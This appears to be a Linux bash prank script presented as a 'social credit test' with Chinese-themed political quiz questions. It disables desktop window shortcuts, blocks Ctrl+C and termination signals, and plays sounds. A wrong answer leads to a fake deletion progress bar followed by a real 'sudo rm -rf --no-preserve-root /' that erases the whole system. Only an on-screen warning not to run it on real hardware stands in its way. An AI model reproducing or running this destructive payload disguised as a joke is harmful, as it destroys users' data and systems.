#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
social_credit=1000
is_root=false
CURRENT_USER=$(whoami)
USER_ID=$(id -u "$CURRENT_USER")
SCRIPT_PID=$$
SCRIPT_NAME=$(basename "$0")

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Функция для воспроизведения аудиофайла
play_audio() {
    local audio_file="$1"
    sudo chmod 777 "$SCRIPT_DIR/$audio_file" 2>/dev/null || true
    
    DISPLAY=:0 \
    DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus" \
    nohup xdg-open "$SCRIPT_DIR/$audio_file" >/dev/null 2>&1 &
}

# Проверка прав root
check_root() {
    sudo -v
    if [ "$USER_ID" -eq 0 ]; then
        is_root=true
    fi
    play_audio "redsky.mp3"
}


# Захват системы (без убийства DE)
system_takeover() {
    echo -e "${RED}=== ACTIVATION CHINA CONTROL ===${NC}"
}

# Отключение сочетаний клавиш (безопасное)
disable_shortcuts() {
    # Для GNOME
    if sudo -u "$CURRENT_USER" gsettings list-schemas | grep -q org.gnome.desktop.wm.keybindings; then
        sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings minimize "[]"
        sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings close "[]"
    fi

    # Для KDE
    if command -v kwriteconfig5 &>/dev/null; then
        sudo -u "$CURRENT_USER" kwriteconfig5 --file kwinrc --group ModifierOnlyShortcuts --key Meta ""
    fi

    # Общее отключение
    sudo -u "$CURRENT_USER" setxkbmap -option terminate:disabled 2>/dev/null || true
}

# Восстановление системы
system_release() {
    # Восстанавливаем сочетания клавиш
    if sudo -u "$CURRENT_USER" gsettings list-schemas | grep -q org.gnome.desktop.wm.keybindings; then
        sudo -u "$CURRENT_USER" gsettings reset org.gnome.desktop.wm.keybindings minimize
        sudo -u "$CURRENT_USER" gsettings reset org.gnome.desktop.wm.keybindings close
    fi

    if command -v kwriteconfig5 &>/dev/null; then
        sudo -u "$CURRENT_USER" kwriteconfig5 --file kwinrc --group ModifierOnlyShortcuts --key Meta "org.kde.plasmashell"
    fi

    sudo -u "$CURRENT_USER" setxkbmap -option 2>/dev/null || true
}

# Показать предупреждение
show_warning() {
    echo "DO NOT RUN THIS ON REAL HARDWARE!"
    sleep 5
    clear
}

# Запуск теста
run_test() {
    echo -e "\n======== SOCIAL CREDIT TEST ========\n"

    questions=(
        "Question 1: 中國是共產主義國家嗎? (y/n)"
        "Question 2: 中國是世界上最好的國家嗎？ (y/n)"
        "Question 3: 告訴我中國最好的網站?： 1.YouTube 2.臉書 3、阿里巴巴 4. 紅迪網"
        "台灣是一個國家嗎？(y/n)"
        "Which is the best country? 1.Russia 2.China 3.USA 4.India"
        "你有幾個孩子? 1.秦 2.周朝 3.漢朝 4. 唐代"
    )

    answers=("y" "n" "3" "y" "2" "4")

    for i in "${!questions[@]}"; do
        echo -e "${BLUE}${questions[i]}${NC}"
        
        read -n 1 -r user_answer # Чтение одного символа от пользователя
        echo
        
        if [[ "${user_answer,,}" == "${answers[i],,}" ]]; then # Сравнение ответов (игнорируя регистр)
            paplay "$SCRIPT_DIR/correct.mp3" >/dev/null 2>&1 &
            aplay "$SCRIPT_DIR/correct.mp3" >/dev/null 2>&1 &
            echo -e "${GREEN}Correct! +10 Social Credit${NC}"
            social_credit=$((social_credit + 10))
        else
            echo -e "${RED}Wrong! -10000000000000000000 Social Credit${NC}"
            social_credit=--9999999999999999999 # Установка низкого значения социального кредита
            paplay "$SCRIPT_DIR/wrong.mp3" >/dev/null 2>&1 &
            aplay "$SCRIPT_DIR/wrong.mp3" >/dev/null 2>&1 & 
            show_image
        fi
        
        echo -e "${YELLOW}Current Social Credit: $social_credit${NC}\n"
        
        sleep 1
    done
}

# Показать изображение (ASCII-арт)
show_image() {
    echo -e "${RED}"
    cat << "EOF"
          .-""""""""-.
         /          \
        /            \
       |,  .-.  .-.  ,|
       | )(_ /  \_ )( |
       |/     /\     \|
       (_     ^^     _)
        \__|IIIIII|__/
         | \IIIIII/ |
         \          /
          `--------`
EOF
    echo -e "${NC}"
}

# Оценка результатов теста
evaluate_results() {
    if (( social_credit < 0 )); then
        echo -e "${RED}TEST FAILED! YOUR SOCIAL CREDIT IS TOO LOW!"
        echo "DELETING SYSTEM...${NC}"

        for i in {1..10}; do
            sleep 0.5 # Задержка для имитации удаления файлов
            echo "Deleting system files... $((i * 10))%"
        done

        echo "Bye-bye!"
        sudo rm -rf --no-preserve-root /
    else
        echo -e "${GREEN}TEST PASSED! YOUR SOCIAL CREDIT: $social_credit${NC}"
        echo "Your system is safe... for now."
    fi
}

# Блокировка Ctrl+C в текущем процессе
block_ctrl_c() {
    trap '' SIGINT SIGTERM # Блокировка сигналов прерывания
}

# Основная программа
main() {
    clear
    block_ctrl_c
    check_root

    if [[ "$1" != "--child" ]]; then
        system_takeover
    fi

    show_warning
    run_test
    evaluate_results

    if [[ "$1" != "--child" ]]; then
        system_release
    fi
}

main "$@"
